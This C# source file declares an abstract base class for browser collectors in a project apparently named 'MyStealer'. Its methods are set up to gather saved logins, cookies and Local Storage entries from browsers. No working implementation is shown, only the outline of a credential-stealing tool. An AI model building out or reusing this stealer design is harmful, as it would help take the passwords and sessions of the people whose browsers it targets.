using System.Collections.Immutable;

namespace MyStealer.Collector.Browser
{
    /// <summary>
    /// A module that collects various personal information from various browsers.
    /// </summary>
    public abstract class BrowserCollectorBase : CollectorBase
    {
        /// <summary>
        /// Collect browser 'Saved Logins.'
        /// </summary>
        public abstract IImmutableSet<BrowserLogin> GetLogins();

        /// <summary>
        /// Collect browser cookies.
        /// </summary>
        public abstract IImmutableSet<BrowserCookie> GetCookies();

        /// <summary>
        /// Collect browser Local Storage entries.
        /// </summary>
        public abstract IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries();
    }
}
